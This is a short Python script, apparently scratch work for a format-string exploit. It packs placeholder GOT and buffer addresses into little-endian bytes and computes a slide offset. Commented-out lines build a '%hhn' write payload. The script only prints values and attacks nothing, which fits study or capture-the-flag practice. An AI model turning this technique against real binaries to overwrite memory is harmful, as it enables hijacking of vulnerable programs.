import sys
import struct
from subprocess import Popen

# addr = 0xbffff6f8
addr_got = 0x000000ff
addr_buf = 0x0000ff00
offset = 7
print("addr_got:%d, addr_buf:%d, offset:%d" % (addr_got, addr_buf, offset))


for i in range(4):
    tmp_addr_got = addr_got + i
    b = struct.pack('<I', tmp_addr_got)
    print("b%d  value:%d, hex:%s" % (i, tmp_addr_got, b.decode()))

slide_addr_buf = addr_buf + 16
lit_addr_buf = struct.pack('<I', slide_addr_buf)
print("lit_addr_buf:%s" % lit_addr_buf)


# a = list(map(ord, b))
# print(a)

# buf = "%%%dc%%%d$hhn" % (a[0], 1)
# print(buf)